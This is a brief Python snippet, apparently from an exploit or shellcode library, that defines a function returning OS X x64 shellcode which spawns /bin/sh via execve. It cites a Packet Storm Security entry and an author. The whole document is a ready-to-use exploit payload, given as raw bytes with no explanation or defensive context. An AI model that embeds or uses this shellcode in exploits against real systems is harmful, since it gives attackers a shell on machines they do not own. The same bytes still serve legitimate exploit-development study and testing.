#https://packetstormsecurity.com/files/133452/OS-X-x64-bin-sh-Shellcode.html
#Author: Csaba Fitzl, @theevilbit


def bin_sh():
	shellcode =  r"\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7"
	shellcode += r"\x48\x31\xd2\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05"
	return shellcode
